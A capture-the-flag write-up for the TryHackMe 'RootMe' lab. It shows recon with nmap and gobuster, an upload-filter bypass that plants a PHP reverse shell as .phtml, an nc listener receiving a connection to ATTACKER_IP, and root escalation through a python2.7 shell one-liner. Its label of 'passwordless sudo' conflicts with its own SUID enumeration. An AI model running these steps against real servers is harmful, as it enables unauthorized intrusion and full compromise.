# RootMe — Writeup

> This is a common red-teaming loop for PHP applications and Linux-based servers.

## Recon

```bash
sudo nmap -sC -sV <TARGET_IP> --top-ports 10000 -o nmaplog-222.log
```

```
22/tcp open  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http   Apache httpd 2.4.41 ((Ubuntu))
```

```bash
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -x .php,.xml,.txt -t 50 -o gob-222.log -u <TARGET_IP>
```

```
index.php             (Status: 200)
uploads/               (Status: 301)
css/                    (Status: 301)
js/                     (Status: 301)
panel/                  (Status: 301)
server-status           (Status: 403)
```

## Initial Foothold

- `/panel/` — file upload functionality discovered.
- Renamed payload extension to bypass filter:

```bash
mv ./phprev.php ./phprev.phtml
```

- Uploaded via `/panel/` upload form.
- Confirmed upload at `/uploads/phprev.phtml`.
- Triggered reverse shell:

```bash
nc -lvnp 9878
```

```
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 34382
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User Flag

```bash
find / -type f -name user.txt 2>/dev/null
cat /var/www/user.txt
```

```
THM{REDACTED}
```

## Privilege Escalation

```bash
sudo -l
```

```
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

- SUID/sudo binaries enumerated:

```bash
find / -type f -user root -perm -u=s 2>/dev/null
ls -al /usr/bin | grep sudo
```

- `/usr/bin/python2.7` present with no password required (passwordless sudo):

```bash
# gtfobins
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
whoami
root
```

## Root Flag

```bash
find / -type f -user root -name root.txt 2>/dev/null
cat root/root.txt
```

```
THM{REDACTED}
```